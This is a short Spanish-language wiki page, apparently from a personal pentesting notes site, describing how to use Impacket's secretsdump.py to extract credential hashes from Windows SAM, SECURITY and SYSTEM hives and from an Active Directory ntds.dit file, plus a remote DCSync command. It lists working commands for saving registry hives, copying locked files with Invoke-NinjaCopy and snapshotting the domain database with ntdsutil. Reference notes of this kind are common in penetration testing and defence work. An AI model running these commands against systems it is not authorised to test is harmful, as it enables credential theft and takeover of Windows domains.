---
layout: single
title: secretsdump.py
excerpt: "Herramienta para dumpear credenciales de una máquina Windows o un DC."
date: 2021-12-08
classes: wide
header:
  teaser: /assets/images/Tools/bash-icon.png
  teaser_home_page: true
  icon: /assets/images/tool.png
categories:
  - Tools
tags:
  - CLI
  - Windows
  - Active Directory

---


# Definición
Herramienta para obtener las credenciales de una máquina o DC de un [Active Directory](/Active-Directory/). Para ello tenemos que proporcionarle distintos registros.

# Uso
Podemos obtener los diferentes hashes del [Almacenamiento de credenciales](/Almacenamiento-de-credenciales/)
## SAM
### Obtención de registros.
La forma más facil de obtenerlos es copiarlos del registro
```powershell
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
Aunque también se pueden obtener copiándolos del sistema de archivos. Para esto necesitamos la herrmaienta [Invoke-NinjaCopy](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)

```powershell
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\SAM" -LocalDestination "x:\sam"
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\SYSTEM" -LocalDestination "x:\system"
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\security" -LocalDestination "x:\security"
```

### Extracción de hashes
Una vez tenemos los registros en nuestr máquina de atacante, utilizamos la herramienta.

```bash
secretsdump.py -sam sam -security security -system system -outputfile credentials.txt LOCAL
```

## NTDS.dit
### LOCAL
#### Obtención de registros
Para esto necesitamos el registro **system** y **ntds.dit**

```powershell
reg save HKLM\system system
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

O con la herramienta [Invoke-NinjaCopy](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1), copiándolos desde sus rutas. [Almacenamiento de credenciales](/Almacenamiento-de-credenciales/)

```powershell
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\SYSTEM" -LocalDestination "x:\system"
Invoke-NinjaCopy.ps1 -Path "C:\Windows\ntds\ntds.dit" -LocalDestination "x:\ntds.dit"
```

#### Extracción de hashes
```bash
secretsdump.py -ntds ntds.dit -system system -outputfile credentials.txt LOCAL
```

### Remoto
Necesitamos credenciales válidas con un usuario con capacidad de DCSync para realizar un DCSync Attack.
```bash
secretsdump.py '<DOMAIN>/<USER>:<PASS>@<DOMAIN_CONTROLLER_IP>'
```

Para archivos grandes se recomienda [gosecretsdump](https://github.com/c-sto/gosecretsdump)


---

Escrito el 08-12-2021 a las 02:44 pm por creep33.
